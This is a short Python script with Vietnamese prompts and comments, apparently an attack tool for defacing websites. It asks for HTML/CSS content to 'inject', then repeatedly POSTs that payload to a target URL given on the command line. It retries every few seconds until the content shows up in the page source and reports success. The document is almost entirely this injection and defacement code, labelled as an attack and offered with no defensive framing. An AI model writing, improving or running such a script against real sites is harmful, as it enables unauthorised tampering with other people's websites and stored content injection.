import requests
import time
import sys
import os

def main():
    if len(sys.argv) < 2:
        print("Ban chua nhap link web!")
        return

    target = sys.argv[1]
    os.system('clear')
    print(f"--- DANG QUAN LY WEB: {target} ---")

    # BƯỚC 1: Bạn muốn thay đổi cái gì?
    print("\n[!] Nhap noi dung HTML/CSS ban muon 'TIEM' vao:")
    print("(Vi du: <h1 style='color:red;'>HI</h1>)")
    payload = input("=> Noi dung: ")

    print("\n[*] Bat dau tan cong va kiem tra tuyet doi...")
    
    while True:
        try:
            # BƯỚC 2: Gui ma cua ban len web
            requests.post(target, data={'content': payload}, timeout=5)
            
            # BƯỚC 3: SAO CHEP TOAN BO ma nguon web ve de SO SANH
            # Day la cho ban can: Kiem tra xem web co thuc su thay doi khong
            check_web = requests.get(target, timeout=5)
            ma_nguon_hien_tai = check_web.text

            # BƯỚC 4: SO SANH TUYET DOI
            if payload in ma_nguon_hien_tai:
                print("\n[✓] THANH CONG!")
                print(f"[i] Ma nguon web da khớp hoan toan voi ma ban nhap.")
                print(f"[i] Noi dung '{payload}' da xuat hien.")
                break # Dung lai vi da thanh cong
            else:
                # Neu chua giong, no se bao dang cho va gui lai
                print("[...] Dang doi web cap nhat... (Chua giong ma ban nhap)", end='\r')
            
            time.sleep(2) # Nghi 2 giay roi thu lai
        except:
            print("[!] Loi ket noi! Dang thu lai...")
            time.sleep(3)

if __name__ == "__main__":
    main()
    
